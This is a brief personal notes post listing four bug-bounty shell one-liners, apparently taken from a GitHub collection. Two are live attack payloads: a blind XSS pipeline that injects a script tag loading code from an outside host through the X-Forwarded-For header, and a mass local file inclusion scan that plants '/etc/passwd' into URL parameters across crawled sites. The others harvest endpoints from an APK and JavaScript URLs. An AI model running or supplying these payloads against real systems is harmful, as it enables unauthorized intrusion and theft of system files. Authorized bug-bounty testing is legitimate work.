Daily Notes : Day 53 
One liners - Part 2 

1: Blind XSS In X-Forwarded-For Header
subfinder -d http://target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"

2: Endpoints, by apks
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|http://schemas.android\|google\|http://goo.gl"

3: Local File Inclusion
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

4: search javascript file
gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt

Ref: https://github.com/twseptian/oneliner-bugbounty